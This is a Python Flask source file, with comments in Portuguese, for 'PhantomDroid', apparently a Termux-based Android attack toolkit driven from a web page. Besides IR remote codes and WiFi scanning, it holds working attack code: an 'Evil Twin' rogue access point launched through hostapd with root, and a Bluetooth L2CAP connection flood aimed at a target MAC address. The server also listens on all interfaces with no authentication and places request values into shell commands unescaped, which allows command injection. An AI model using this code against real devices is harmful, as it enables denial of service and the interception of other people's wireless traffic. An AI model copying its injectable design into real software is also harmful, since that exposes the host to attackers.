"""
PhantomDroid - Termux Edition
Roda no Termux com: python server.py
Acesse no navegador: http://<seu-IP>:8080

Requer:
  pkg install python termux-api bluetoothctl
  pip install flask
  (Instale o app Termux:API na Play Store também)
"""

import json
import re
import socket
import subprocess
import threading
import time
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# ─────────────────────────────────────────────
#  UTILS
# ─────────────────────────────────────────────

def run_cmd(cmd, timeout=15):
    """Executa comando shell e retorna stdout/stderr.
    NÃO verifica returncode — alguns comandos retornam 1 mas têm saída válida.
    """
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout
        )
        out = result.stdout.strip()
        err = result.stderr.strip()
        return {"ok": True, "out": out, "err": err, "code": result.returncode}
    except subprocess.TimeoutExpired:
        return {"ok": False, "out": "", "err": "Timeout", "code": -1}
    except Exception as e:
        return {"ok": False, "out": "", "err": str(e), "code": -1}


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ─────────────────────────────────────────────
#  ROTAS PRINCIPAIS
# ─────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html", local_ip=get_local_ip())


@app.route("/api/status")
def status():
    return jsonify({"status": "online", "ip": get_local_ip()})


# ─────────────────────────────────────────────
#  IR REMOTE
# ─────────────────────────────────────────────

IR_CODES = {
    "samsung_power":    {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,47250"},
    "samsung_vol_up":   {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,560,560,1690,560,1690,560,47250"},
    "samsung_vol_down": {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,1690,560,560,560,560,560,560,560,1690,560,560,560,560,560,1690,560,560,560,1690,560,1690,560,1690,560,560,560,1690,560,1690,560,47250"},
    "samsung_mute":     {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,560,560,1690,560,1690,560,1690,560,560,560,1690,560,1690,560,47250"},
    "lg_power":         {"freq": 38000, "pattern": "9000,4500,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,47250"},
    "lg_vol_up":        {"freq": 38000, "pattern": "9000,4500,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,47250"},
    "sony_power":       {"freq": 40000, "pattern": "2400,600,1200,600,600,600,1200,600,600,600,600,600,1200,600,600,600,600,600,600,600,600,600,600,600,47250"},
    "philips_power":    {"freq": 36000, "pattern": "889,889,889,2667,889,889,889,889,889,2667,889,889,889,889,889,889,889,889,889,2667,889,47250"},
}

@app.route("/api/ir/codes")
def ir_codes():
    return jsonify(list(IR_CODES.keys()))

@app.route("/api/ir/send", methods=["POST"])
def ir_send():
    data = request.json or {}
    preset = data.get("preset")
    freq = data.get("freq")
    pattern = data.get("pattern")

    if preset and preset in IR_CODES:
        freq = IR_CODES[preset]["freq"]
        pattern = IR_CODES[preset]["pattern"]

    if not freq or not pattern:
        return jsonify({"ok": False, "err": "Informe freq e pattern ou escolha um preset"}), 400

    cmd = f"termux-infrared-transmit -f {freq} {pattern}"
    result = run_cmd(cmd, timeout=10)

    # termux-infrared-transmit retorna nada no stdout em caso de sucesso
    if result["code"] == 0 or (not result["err"]):
        return jsonify({"ok": True, "out": "Sinal enviado"})
    return jsonify({"ok": False, "err": result["err"] or "Falha ao enviar IR"})

@app.route("/api/ir/check")
def ir_check():
    result = run_cmd("termux-infrared-frequencies", timeout=8)
    out = result["out"]
    if out and "[" in out:
        return jsonify({"ok": True, "frequencies": out})
    return jsonify({"ok": False, "err": "IR não suportado ou Termux:API não instalado. Instale o app Termux:API da Play Store e permita acesso ao IR."})


# ─────────────────────────────────────────────
#  WIFI SCANNER / EVIL TWIN
# ─────────────────────────────────────────────

def _wifi_scan_termux_api():
    """Tenta via termux-wifi-scaninfo (requer Termux:API do F-Droid)."""
    result = run_cmd("termux-wifi-scaninfo", timeout=20)
    out = result["out"] or result["err"]
    if not out:
        return None, "Sem resposta do termux-wifi-scaninfo"
    # Detecta erro da Play Store (versão quebrada)
    if "not yet available" in out or "not available" in out.lower():
        return None, "PLAY_STORE_BROKEN"
    try:
        networks = json.loads(out)
        if isinstance(networks, list):
            return networks, None
        if isinstance(networks, dict) and "error" in networks:
            return None, networks["error"]
        return [networks], None
    except json.JSONDecodeError:
        return None, out[:300]


def _wifi_scan_wpa_cli():
    """
    Fallback: usa wpa_cli (disponível em Termux sem Termux:API).
    Formato de saída do scan_results:
      bssid / frequency / signal level / flags / ssid
      00:11:22:33:44:55\t2437\t-65\t[WPA2-PSK]\tMinhaRede
    """
    # Dispara o scan
    run_cmd("wpa_cli -i wlan0 scan", timeout=5)
    time.sleep(3)  # aguarda varredura
    result = run_cmd("wpa_cli -i wlan0 scan_results", timeout=10)
    out = result["out"]

    if not out or "FAIL" in out or "Unknown command" in out:
        return None, "wpa_cli não disponível ou sem permissão"

    networks = []
    lines = out.strip().split("\n")
    # Pula cabeçalho "bssid / frequency / ..."
    for line in lines[1:]:
        parts = line.split("\t")
        if len(parts) >= 5:
            bssid = parts[0].strip()
            freq = parts[1].strip()
            level = parts[2].strip()
            flags = parts[3].strip()
            ssid = parts[4].strip() or "(oculta)"
            try:
                level_int = int(level)
            except ValueError:
                level_int = -80
            security = "WPA" if "WPA" in flags else ("WEP" if "WEP" in flags else "Open")
            networks.append({
                "ssid": ssid,
                "bssid": bssid,
                "rssi": level_int,
                "frequency": freq,
                "capabilities": flags,
                "security": security,
            })
    if not networks:
        return None, "Nenhuma rede encontrada pelo wpa_cli"
    return networks, None


@app.route("/api/wifi/scan")
def wifi_scan():
    # 1. Tenta Termux:API
    networks, err = _wifi_scan_termux_api()
    if networks is not None:
        return jsonify({"ok": True, "networks": networks, "source": "termux-api"})

    # 2. Se Termux:API da Play Store estiver quebrada, tenta wpa_cli
    if err == "PLAY_STORE_BROKEN":
        networks2, err2 = _wifi_scan_wpa_cli()
        if networks2:
            return jsonify({"ok": True, "networks": networks2, "source": "wpa_cli"})
        return jsonify({
            "ok": False,
            "err": "Termux:API da Play Store está quebrada e wpa_cli também falhou",
            "tip": "SOLUÇÃO: instale o Termux E o Termux:API pelo F-Droid (não Play Store). Link: https://f-droid.org/packages/com.termux.api/",
            "fdroid": True
        })

    # 3. Erro genérico — tenta wpa_cli como fallback
    networks2, err2 = _wifi_scan_wpa_cli()
    if networks2:
        return jsonify({"ok": True, "networks": networks2, "source": "wpa_cli"})

    return jsonify({
        "ok": False,
        "err": err or "Falha no scan WiFi",
        "tip": "SOLUÇÃO: instale o Termux:API pelo F-Droid: https://f-droid.org/packages/com.termux.api/  —  E conceda permissão de Localização ao Termux no Android",
        "fdroid": True
    })

@app.route("/api/wifi/info")
def wifi_info():
    result = run_cmd("termux-wifi-connectioninfo", timeout=10)
    out = result["out"] or result["err"]
    if out:
        try:
            info = json.loads(out)
            return jsonify({"ok": True, "info": info})
        except Exception:
            return jsonify({"ok": False, "err": out[:200]})
    return jsonify({"ok": False, "err": "Sem resposta"})

@app.route("/api/wifi/evil_twin", methods=["POST"])
def wifi_evil_twin():
    data = request.json or {}
    ssid = data.get("ssid", "FreeWiFi")

    root_check = run_cmd("su -c 'echo ROOT_OK'", timeout=5)
    has_root = "ROOT_OK" in root_check["out"]

    if not has_root:
        return jsonify({
            "ok": False,
            "err": "Root necessário para criar Evil Twin",
            "tip": f"Com root, instale: pkg install hostapd dnsmasq  —  SSID alvo: '{ssid}'"
        })

    hostapd_conf = (
        f"interface=wlan0\ndriver=nl80211\nssid={ssid}\n"
        "hw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"
    )
    conf_path = "/data/data/com.termux/files/home/hostapd_phantom.conf"
    with open(conf_path, "w") as f:
        f.write(hostapd_conf)

    result = run_cmd(f"su -c 'hostapd {conf_path} &'", timeout=5)
    return jsonify({"ok": True, "msg": f"AP '{ssid}' iniciado", "detail": result["out"]})


# ─────────────────────────────────────────────
#  BLUETOOTH DEAUTH (L2CAP FLOOD)
# ─────────────────────────────────────────────

bt_flood_active = False
bt_flood_thread = None

def _l2cap_flood(target_mac, duration, results):
    global bt_flood_active
    end_time = time.time() + duration
    count = 0
    errors = 0

    while bt_flood_active and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_L2CAP)
            sock.settimeout(0.5)
            sock.connect((target_mac, 1))
            sock.close()
            count += 1
        except Exception:
            errors += 1
        time.sleep(0.05)

    results["count"] = count
    results["errors"] = errors
    bt_flood_active = False


def _scan_bluetooth_devices():
    """
    BUG CORRIGIDO: bluetoothctl scan interativo com timeout real.
    Abre bluetoothctl como processo interativo, escaneia por 8s, encerra e
    retorna lista de devices como [{"mac": ..., "name": ...}].
    """
    devices = {}

    try:
        proc = subprocess.Popen(
            ["bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        # Lê saída em thread separada para não travar
        output_lines = []
        def reader():
            for line in proc.stdout:
                output_lines.append(line)

        t = threading.Thread(target=reader, daemon=True)
        t.start()

        # Liga scan
        proc.stdin.write("scan on\n")
        proc.stdin.flush()

        # Aguarda 8 segundos capturando devices
        time.sleep(8)

        # Desliga scan e lista devices
        proc.stdin.write("scan off\ndevices\nquit\n")
        proc.stdin.flush()

        # Aguarda encerrar (máx 4s)
        try:
            proc.wait(timeout=4)
        except subprocess.TimeoutExpired:
            proc.kill()

        t.join(timeout=2)

        # Parseia linhas
        for line in output_lines:
            # Formato: "[NEW] Device AA:BB:CC:DD:EE:FF Nome"
            # ou:      "Device AA:BB:CC:DD:EE:FF Nome"
            m = re.search(r'Device\s+([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+(.*)', line)
            if m:
                mac = m.group(1).strip()
                name = m.group(2).strip() or "Desconhecido"
                # Remove lixo do bluetoothctl (códigos ANSI)
                name = re.sub(r'\x1b\[[0-9;]*m', '', name).strip()
                if mac not in devices:
                    devices[mac] = name

    except FileNotFoundError:
        # bluetoothctl não instalado
        return None, "bluetoothctl não encontrado. Instale: pkg install bluez"
    except Exception as e:
        return None, str(e)

    device_list = [{"mac": mac, "name": name} for mac, name in devices.items()]
    return device_list, None


@app.route("/api/bt/scan")
def bt_scan():
    # BUG CORRIGIDO: scan real com bluetoothctl interativo + timeout definido
    device_list, error = _scan_bluetooth_devices()

    if error:
        return jsonify({"ok": False, "err": error, "devices": []})

    return jsonify({
        "ok": True,
        "devices": device_list,
        "count": len(device_list),
        "tip": "Coloque o dispositivo alvo em modo visível (discoverable) para aparecer aqui"
    })


@app.route("/api/bt/deauth", methods=["POST"])
def bt_deauth():
    global bt_flood_active, bt_flood_thread

    data = request.json or {}
    target = data.get("mac", "").strip().upper()
    duration = max(5, min(120, int(data.get("duration", 30))))

    if not target:
        return jsonify({"ok": False, "err": "MAC obrigatório (ex: AA:BB:CC:DD:EE:FF)"}), 400

    if bt_flood_active:
        return jsonify({"ok": False, "err": "Flood já em andamento. Clique em PARAR primeiro."}), 400

    if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', target):
        return jsonify({"ok": False, "err": f"MAC inválido: {target}"}), 400

    bt_flood_active = True
    results = {}
    bt_flood_thread = threading.Thread(
        target=_l2cap_flood, args=(target, duration, results), daemon=True
    )
    bt_flood_thread.start()

    return jsonify({
        "ok": True,
        "msg": f"L2CAP flood iniciado → {target} por {duration}s"
    })


@app.route("/api/bt/stop", methods=["POST"])
def bt_stop():
    global bt_flood_active
    bt_flood_active = False
    return jsonify({"ok": True, "msg": "Flood parado"})


@app.route("/api/bt/status")
def bt_status():
    return jsonify({"active": bt_flood_active})


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────

if __name__ == "__main__":
    ip = get_local_ip()
    print(f"""
╔══════════════════════════════════════╗
║       PhantomDroid - Termux          ║
╠══════════════════════════════════════╣
║  Acesse no navegador:                ║
║  http://{ip}:8080           ║
║  http://localhost:8080               ║
╚══════════════════════════════════════╝
Pressione Ctrl+C para encerrar.
""")
    app.run(host="0.0.0.0", port=8080, debug=False, threaded=True)
